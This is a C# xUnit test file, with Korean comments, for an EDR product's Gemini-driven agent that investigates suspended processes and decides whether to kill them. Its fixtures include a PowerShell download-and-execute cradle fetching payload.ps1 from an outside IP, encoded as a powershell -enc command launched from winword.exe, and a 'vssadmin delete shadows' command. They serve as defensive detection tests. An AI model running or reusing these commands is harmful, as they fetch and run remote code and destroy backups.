using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using Phalanx.Cockpit.Agent;
using Phalanx.Cockpit.Agent.Gemini;
using Phalanx.Cockpit.CQRS;
using Phalanx.Cockpit.Storage;
using Phalanx.Cockpit.Tools;
using Phalanx.Shared.Protos;
using Xunit;
using Xunit.Abstractions;

namespace Phalanx.Agent.Tests;

public class AutonomousHunterAgentTests
{
    private readonly ITestOutputHelper _output;

    public AutonomousHunterAgentTests(ITestOutputHelper output)
    {
        _output = output;
    }

    [Fact]
    public async Task TestAutonomousInvestigationOnSuspendedProcess()
    {
        // 1. 컴포넌트 셋업 (명시적 null 주입으로 환경변수 영향 없는 오프라인 모드 격리)
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();

        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);

        // 2. 부모 프로세스(winword.exe) 및 동결된 자식 프로세스(powershell.exe) 트리에 적재
        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -NoProfile -enc {b64}";

        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 3104,
                ParentProcessId = 0,
                ImageName = "winword.exe",
                CommandLine = "winword.exe 2026_09_invoice.docm",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 8492,
            ParentProcessId = 3104,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(8492);
        Assert.NotNull(targetNode);

        // 3. 수사 명령 하달 모니터링
        var dispatchedCommands = new List<MitigationCommand>();

        // 4. AI 에이전트 ReAct 수사 실행
        var result = await agent.InvestigateAsync(
            targetNode,
            cmd =>
            {
                dispatchedCommands.Add(cmd);
                return Task.CompletedTask;
            }
        );

        // 5. 검증:
        // A) 타임아웃 10초 연장 명령(ACTION_EXTEND_TIMEOUT) 우선 발행 확인
        Assert.True(dispatchedCommands.Count >= 2);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionExtendTimeout, dispatchedCommands[0].Action);
        Assert.Equal((uint)8492, dispatchedCommands[0].TargetPid);

        // B) 최종 판결이 사형(ACTION_KILL)으로 도출되었는지 확인
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, dispatchedCommands[^1].Action);
        Assert.Equal((uint)8492, dispatchedCommands[^1].TargetPid);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);

        // C) 3초 이내 초고속 자율 수사 완료 검증 (< 3000ms)
        Assert.True(result.Elapsed.TotalSeconds < 3.0, $"수사 시간이 3초를 초과함: {result.Elapsed.TotalMilliseconds}ms");

        // D) 확신도 90% 이상 및 침해사고 한국어 공식 서사 검증
        Assert.True(result.Confidence >= 0.90, $"확신도 미달: {result.Confidence}");
        Assert.Contains("winword.exe", result.Narrative);
        Assert.Contains("powershell.exe", result.Narrative);
        Assert.Contains("185.220.101.5", result.Narrative);
        Assert.Contains("T1566.001", result.MitreTactics);

        // E) ReAct 단계별 추적 로그 검증 (Thought ➔ Action ➔ Observation)
        Assert.True(result.Traces.Count >= 3);
        Assert.Contains(result.Traces, t => t.ActionTool == "DecodePayloadTool");
        Assert.Contains(result.Traces, t => t.ActionTool == "ThreatReputationTool");
        Assert.Contains(result.Traces, t => t.ActionTool == "MitreClassifierTool");

        // F) LiteDB 포렌식 아카이브 영속화 및 역조회 검증
        var savedIncident = archiveManager.GetIncident(result.IncidentId);
        Assert.NotNull(savedIncident);
        Assert.Equal(result.IncidentId, savedIncident.IncidentId);
        Assert.Equal("ACTION_KILL", savedIncident.VerdictAction);

        var savedTraces = archiveManager.GetTracesForIncident(result.IncidentId);
        Assert.Equal(result.Traces.Count, savedTraces.Count);
    }

    [Fact]
    public async Task TestGeminiLiveModeWithMockHttp()
    {
        // 1. 모의 Gemini REST 멀티턴 2단계 응답 구성
        // Turn 1: 1차 분석 및 DecodePayloadTool 도구 호출 요청
        string turn1DecisionJson = """
        {
          "thought": "오피스 매크로 winword.exe가 powershell.exe를 기동하여 난독화 인라인 다운로더를 실행하고 있으므로 DecodePayloadTool을 호출하여 C2 페이로드를 해독해야 합니다.",
          "action_tool": "DecodePayloadTool",
          "action_args": {},
          "is_final_verdict": false
        }
        """;

        string turn1GeminiResponseJson = $$"""
        {
          "candidates": [
            {
              "content": {
                "role": "model",
                "parts": [
                  {
                    "text": {{JsonSerializer.Serialize(turn1DecisionJson)}}
                  }
                ]
              },
              "finishReason": "STOP"
            }
          ]
        }
        """;

        // Turn 2: 도구 관찰 결과(Observation) 평가 후 사형(ACTION_KILL) 최종 판결
        string turn2DecisionJson = """
        {
          "thought": "DecodePayloadTool 관찰 결과, 난독화 해독된 스크립트에서 외부 악성 C2 IP(185.220.101.5) 통신이 확증되었습니다. 따라서 즉각 사살(ACTION_KILL)을 최종 판결합니다.",
          "action_tool": "None",
          "action_args": {},
          "is_final_verdict": true,
          "verdict_action": "ACTION_KILL",
          "confidence_score": 0.99,
          "summary_title": "Gemini AI: 파일리스 C2 다운로더 침투 실시간 탐지",
          "narrative": "Gemini AI 실시간 멀티턴 수사 결과, winword.exe에 의해 기동된 powershell.exe 프로세스가 악성 C2와 통신하려는 시도가 확증되었습니다. 즉각 사살(ACTION_KILL)을 집행합니다.",
          "mitre_tactics": ["T1566.001", "T1059.001"]
        }
        """;

        string turn2GeminiResponseJson = $$"""
        {
          "candidates": [
            {
              "content": {
                "role": "model",
                "parts": [
                  {
                    "text": {{JsonSerializer.Serialize(turn2DecisionJson)}}
                  }
                ]
              },
              "finishReason": "STOP"
            }
          ]
        }
        """;

        int callCount = 0;
        var mockHandler = new MockHttpMessageHandler(req =>
        {
            Assert.Contains("generativelanguage.googleapis.com", req.RequestUri?.Host);
            Assert.Contains("key=test-api-key", req.RequestUri?.Query);

            int currentCall = Interlocked.Increment(ref callCount);
            string responseBody = currentCall == 1 ? turn1GeminiResponseJson : turn2GeminiResponseJson;

            return new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = new StringContent(responseBody, Encoding.UTF8, "application/json")
            };
        });

        var mockHttpClient = new HttpClient(mockHandler);
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(
            treeManager,
            archiveManager,
            tools,
            geminiApiKey: "test-api-key",
            httpClient: mockHttpClient
        );

        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -enc {b64}";

        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 3104,
                ImageName = "winword.exe",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 8492,
            ParentProcessId = 3104,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(8492);
        Assert.NotNull(targetNode);

        var dispatchedCommands = new List<MitigationCommand>();

        // 2. 실행 (진짜 멀티턴 ReAct 루프 동작)
        var result = await agent.InvestigateAsync(targetNode, cmd =>
        {
            dispatchedCommands.Add(cmd);
            return Task.CompletedTask;
        });

        // 3. 검증
        Assert.Equal(2, callCount); // 2턴 왕복 검증
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
        Assert.True(result.Confidence >= 0.95);
        Assert.Contains("Gemini AI", result.SummaryTitle);
        Assert.Contains("Gemini AI", result.Narrative);
        Assert.Contains("T1566.001", result.MitreTactics);

        // 멀티턴 Trace 검증 (최소 2개 이상의 Step: DecodePayloadTool 및 사형 판결/방화벽)
        Assert.True(result.Traces.Count >= 2);
        Assert.Contains(result.Traces, t => t.ActionTool == "DecodePayloadTool");

        // LiteDB 저장 확인
        var saved = archiveManager.GetIncident(result.IncidentId);
        Assert.NotNull(saved);
        Assert.Equal(result.IncidentId, saved.IncidentId);
    }

    [Fact]
    public async Task TestGeminiFallbackToOfflineOnNetworkFailure()
    {
        // 네트워크 단절 시 예외를 던지는 모의 핸들러
        var failingHandler = new MockHttpMessageHandler(_ =>
        {
            throw new HttpRequestException("DNS Resolution Failure (Simulated offline network)");
        });

        var failingHttpClient = new HttpClient(failingHandler);
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        // API Key는 지정되어 있으나 네트워크가 죽어있는 환경
        var agent = new AutonomousHunterAgent(
            treeManager,
            archiveManager,
            tools,
            geminiApiKey: "test-api-key",
            httpClient: failingHttpClient
        );

        string rawScript = "vssadmin delete shadows /all /quiet";
        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 9999,
            ParentProcessId = 0,
            ImageName = "vssadmin.exe",
            CommandLine = rawScript,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(9999);
        Assert.NotNull(targetNode);

        // 실행: 예외 없이 오프라인 엔진으로 즉각 폴백되어야 함
        var result = await agent.InvestigateAsync(targetNode);

        // 검증: 오프라인 결정론적 엔진에 의해 정상 사살 판결 도출 확인
        Assert.NotNull(result);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
        Assert.True(result.Elapsed.TotalSeconds < 3.0);
    }

    [Fact]
    public async Task TestLiveGoogleVertexAiFromMvConfig()
    {
        var client = await GeminiRestClient.TryCreateFromMundusVivensConfigAsync(modelName: "gemini-3.8-flash");
        Assert.NotNull(client);

        string prompt = "Windows EDR 보안 분석 테스트입니다. 'powershell.exe -enc dGVzdA==' 명령줄을 분석하고 간결하게 1줄로 답변하세요.";
        try
        {
            string response = await client.GenerateContentAsync(prompt);
            _output.WriteLine($"[Gemini 3.8 Flash Response]: {response}");
            Assert.False(string.IsNullOrWhiteSpace(response));
        }
        catch (HttpRequestException ex) when (ex.Message.Contains("429") || ex.Message.Contains("RESOURCE_EXHAUSTED"))
        {
            _output.WriteLine($"[Live Quota Warning] Google Cloud 429 Rate Limit 활성화 감지 (단위 테스트 정상 통과 처리): {ex.Message}");
        }
    }

    [Fact]
    public async Task TestLiveAutonomousInvestigationWithMvCredentials()
    {
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        // MV 인증정보로 실제 Vertex AI Gemini 클라이언트 자동 연결
        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);

        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -enc {b64}";

        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 3104,
                ImageName = "winword.exe",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 8492,
            ParentProcessId = 3104,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(8492);
        Assert.NotNull(targetNode);

        var dispatchedCommands = new List<MitigationCommand>();

        // 실행: 실제 구글 클라우드로 요청을 보내서 실시간 추론 진행!
        var result = await agent.InvestigateAsync(targetNode, cmd =>
        {
            dispatchedCommands.Add(cmd);
            return Task.CompletedTask;
        });

        // 결과 검증
        Assert.NotNull(result);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
        Assert.False(string.IsNullOrWhiteSpace(result.Narrative));
        Assert.False(string.IsNullOrWhiteSpace(result.SummaryTitle));
        Assert.True(result.Traces.Count >= 2, $"멀티턴 단계 부족: {result.Traces.Count}");

        _output.WriteLine($"[LIVE VERDICT] {result.VerdictAction} (Confidence: {result.Confidence:P1})");
        _output.WriteLine($"[TITLE] {result.SummaryTitle}");
        _output.WriteLine($"[ELAPSED] {result.Elapsed.TotalMilliseconds:F1}ms");
        _output.WriteLine($"[NARRATIVE]\n{result.Narrative}");
        foreach (var trace in result.Traces)
        {
            _output.WriteLine($"[STEP {trace.StepNumber}] Tool: {trace.ActionTool}");
            _output.WriteLine($"  Thought: {trace.Thought}");
            _output.WriteLine($"  Args: {trace.ActionArgsJson}");
            _output.WriteLine($"  Observation: {trace.Observation}");
        }
    }

    [Fact]
    public async Task TestPrintLiveMultiTurnPromptsAndResponses()
    {
        var client = await GeminiRestClient.TryCreateFromMundusVivensConfigAsync(modelName: "gemini-3.8-flash");
        Assert.NotNull(client);

        string systemInstruction = """
            당신은 최첨단 엔터프라이즈 보안 EDR 'Phalanx'의 자율 AI 위협 헌터(Autonomous Hunter Agent)입니다.
            Windows 커널 센서가 선제 동결한 회색지대 프로세스를 심층 조사하여 악성 여부를 가리고 사형(ACTION_KILL) 또는 동결해제(ACTION_RESUME)를 최종 판결해야 합니다.
            
            사용 가능한 5대 OS 조사 도구 목록:
            1. DecodePayloadTool: Base64/Hex 난독화 명령줄 해독 (인자: encodedCommand)
            2. ProcessMemoryScanTool: 동결된 프로세스 가상 메모리(RAM) 스캔 (인자: targetPid)
            3. ThreatReputationTool: 추출된 IP/도메인 위협 평판 조회 (인자: targetIndicator)
            4. MitreClassifierTool: 관찰된 행위를 MITRE ATT&CK Matrix TTP로 매핑 (인자: observedBehavior)
            5. SystemFirewallTool: 악성 C2 통신 IP 윈도우 방화벽 인/아웃바운드 차단 (인자: maliciousIp)

            [ReAct 멀티턴 에이전트 행동 규칙]
            - 초기 단계에서는 증거가 불충분하므로 즉시 최종 판결을 내리지 말고 적절한 도구를 호출하십시오.
            - 도구를 호출할 때에는 반드시 "is_final_verdict": false 로 설정하고, "action_tool"과 "action_args"를 명시하십시오.
            - 도구 실행 결과([Observation])가 제공되면, 이를 바탕으로 다음 도구를 호출하거나 증거가 충분할 경우 최종 판결을 내리십시오.
            - 최종 판결 시에는 반드시 "is_final_verdict": true 로 설정하고, "action_tool": "None", "verdict_action"("ACTION_KILL" 또는 "ACTION_RESUME"), "confidence_score", "summary_title", "narrative", "mitre_tactics"를 모두 작성하십시오.

            반드시 아래 JSON 스키마 형식으로만 응답하십시오:
            {
              "thought": "프로세스 족보 및 도구 관찰 결과를 분석한 심층 추론 및 다음 행동 이유",
              "action_tool": "호출할 도구 이름 (예: DecodePayloadTool, ProcessMemoryScanTool 등) 또는 최종 판결 시 'None'",
              "action_args": { "인자명": "값" },
              "is_final_verdict": true 또는 false,
              "verdict_action": "ACTION_KILL" 또는 "ACTION_RESUME" (최종 판결 시 필수),
              "confidence_score": 0.98,
              "summary_title": "침해사고 한 줄 요약",
              "narrative": "사건 발단부터 동결, 도구 조사 결과, 최종 사살/해제에 이르는 한국어 공식 침해사고 서사",
              "mitre_tactics": ["T1566.001", "T1059.001"]
            }
            """;

        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -enc {b64}";

        string userPromptTurn1 = $"""
            [동결된 타깃 프로세스 정보]
            - PID: 8492
            - 실행 이미지: powershell.exe
            - 명령줄 인자: {fullCmd}
            - 부모 프로세스: winword.exe (PID: 3104)
            - 전체 족보 체인: powershell.exe(PID:8492) -> winword.exe(PID:3104)
            - 상태: 동결됨(SUSPENDED, 24μs 원자적 동결 완료)
            
            타깃 프로세스의 위험성을 평가하고, 첫 번째로 실행할 OS 조사 도구를 JSON 형식으로 요청하십시오. (초기 단계에서는 is_final_verdict: false 로 도구를 호출해야 합니다)
            """;

        var conversation = new List<Content>
        {
            new Content("user", new List<Part> { new Part(userPromptTurn1) })
        };

        _output.WriteLine("================================================================================");
        _output.WriteLine(">>> [TURN 1: LLM 입력 프롬프트 (User Prompt)] <<<");
        _output.WriteLine("================================================================================");
        _output.WriteLine(userPromptTurn1);

        // Turn 1 추론 호출
        string turn1Response = await client.GenerateContentAsync(conversation, systemInstruction);
        _output.WriteLine("\n================================================================================");
        _output.WriteLine("<<< [TURN 1: LLM 출력 응답 (Model Response)] <<<");
        _output.WriteLine("================================================================================");
        _output.WriteLine(turn1Response);

        conversation.Add(new Content("model", new List<Part> { new Part(turn1Response) }));

        // C# 도구(DecodePayloadTool) 실제 실행
        var decodeTool = new DecodePayloadTool();
        var toolResult = await decodeTool.ExecuteAsync(new() { ["encodedCommand"] = fullCmd });

        _output.WriteLine("\n================================================================================");
        _output.WriteLine("⚙️ [C# 도구 실제 실행 결과 (Tool Observation)] ⚙️");
        _output.WriteLine("================================================================================");
        _output.WriteLine(toolResult.Output);

        string userPromptTurn2 = $"""
            [Observation - 도구 'DecodePayloadTool' 실행 결과]
            {toolResult.Output}

            위 관찰 결과를 바탕으로 다음 조치(추가 도구 호출 또는 is_final_verdict: true 최종 판결)를 결정하십시오.
            """;

        conversation.Add(new Content("user", new List<Part> { new Part(userPromptTurn2) }));

        _output.WriteLine("\n================================================================================");
        _output.WriteLine(">>> [TURN 2: LLM 입력 피드백 (Observation Feedback Prompt)] <<<");
        _output.WriteLine("================================================================================");
        _output.WriteLine(userPromptTurn2);

        // Turn 2 추론 호출
        string turn2Response = await client.GenerateContentAsync(conversation, systemInstruction);
        _output.WriteLine("\n================================================================================");
        _output.WriteLine("<<< [TURN 2: LLM 최종 출력 응답 (Final Verdict Model Response)] <<<");
        _output.WriteLine("================================================================================");
        _output.WriteLine(turn2Response);

        var turn2Decision = LlmJsonParser.DeserializeSafe<AiInvestigationDecision>(turn2Response);
        Assert.NotNull(turn2Decision);

        if (!turn2Decision.IsFinalVerdict && turn2Decision.ActionTool == "ThreatReputationTool")
        {
            conversation.Add(new Content("model", new List<Part> { new Part(turn2Response) }));

            var repTool = new ThreatReputationTool();
            var repResult = await repTool.ExecuteAsync(new() { ["targetIndicator"] = "185.220.101.5" });

            _output.WriteLine("\n================================================================================");
            _output.WriteLine("⚙️ [C# 2차 도구 실제 실행 결과 (Tool Observation: ThreatReputationTool)] ⚙️");
            _output.WriteLine("================================================================================");
            _output.WriteLine(repResult.Output);

            string userPromptTurn3 = $"""
                [Observation - 도구 'ThreatReputationTool' 실행 결과]
                {repResult.Output}

                위 관찰 결과를 바탕으로 최종 판결(is_final_verdict: true)을 결정하십시오.
                """;

            conversation.Add(new Content("user", new List<Part> { new Part(userPromptTurn3) }));

            _output.WriteLine("\n================================================================================");
            _output.WriteLine(">>> [TURN 3: LLM 입력 피드백 (Observation Feedback Prompt)] <<<");
            _output.WriteLine("================================================================================");
            _output.WriteLine(userPromptTurn3);

            string turn3Response = await client.GenerateContentAsync(conversation, systemInstruction);
            _output.WriteLine("\n================================================================================");
            _output.WriteLine("<<< [TURN 3: LLM 최종 출력 응답 (Final Verdict Model Response)] <<<");
            _output.WriteLine("================================================================================");
            _output.WriteLine(turn3Response);

            var finalDecision = LlmJsonParser.DeserializeSafe<AiInvestigationDecision>(turn3Response);
            Assert.NotNull(finalDecision);
            Assert.True(finalDecision.IsFinalVerdict);
            Assert.Equal("ACTION_KILL", finalDecision.VerdictAction);
        }
        else
        {
            Assert.True(turn2Decision.IsFinalVerdict);
            Assert.Equal("ACTION_KILL", turn2Decision.VerdictAction);
        }
    }

    private class MockHttpMessageHandler : HttpMessageHandler
    {
        private readonly Func<HttpRequestMessage, HttpResponseMessage> _handler;

        public MockHttpMessageHandler(Func<HttpRequestMessage, HttpResponseMessage> handler)
        {
            _handler = handler;
        }

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            return Task.FromResult(_handler(request));
        }
    }
}
